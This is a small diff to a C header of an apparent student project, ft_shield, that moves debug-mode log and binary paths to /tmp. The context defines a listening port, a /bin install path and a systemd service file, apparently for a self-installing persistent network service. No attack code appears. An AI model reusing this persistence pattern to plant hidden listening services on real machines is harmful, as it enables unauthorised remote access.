@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 11:24:44 by mbatty            #+#    #+#             */
-/*   Updated: 2025/11/24 09:20:31 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/11/24 09:27:01 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -52,12 +52,10 @@ stats: see stats about the socket/users\n\
 #   define SERVER_PORT 4242
 #   define LOG_FILE "/var/log/ft_shield.log"
 #   define BIN_FT_SHIELD "/bin/ft_shield"
-#   define CURDIR_PATH ""
 #  else
 #   define SERVER_PORT 7002
-#   define LOG_FILE "ft_shield.log"
-#   define BIN_FT_SHIELD "binft_shield"
-#   define CURDIR_PATH "./"
+#   define LOG_FILE "/tmp/ft_shield.log"
+#   define BIN_FT_SHIELD "/tmp/binft_shield"
 #  endif
 
 # define SERVICE_FILE "/etc/systemd/system/ft_shield.service"
